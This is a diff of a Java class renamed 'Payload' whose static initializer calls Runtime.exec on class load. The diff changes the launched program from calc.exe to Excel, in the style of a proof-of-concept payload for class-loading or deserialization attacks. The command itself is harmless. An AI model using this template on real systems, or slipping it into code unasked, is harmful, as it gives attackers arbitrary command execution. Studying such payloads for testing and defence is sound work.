@@ -1,15 +1,14 @@
-/**
- * @Classname ExecTemplateJDK8
- * @Author Welkin
- */
 import java.io.IOException;
 
-public class ExecTemplateJDK8 {
+public class Payload {
+    public Payload(){
+
+    }
 
     static {
         try {
             Runtime runTime = Runtime.getRuntime();
-            String executablePath = "calc.exe";
+            String executablePath = "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE";
 
             Process process = runTime.exec(executablePath);
 
@@ -17,8 +16,8 @@ public class ExecTemplateJDK8 {
             e.printStackTrace();
         }
     }
+
     public static void main(String[] args) {
         System.out.println();
     }
-
 }
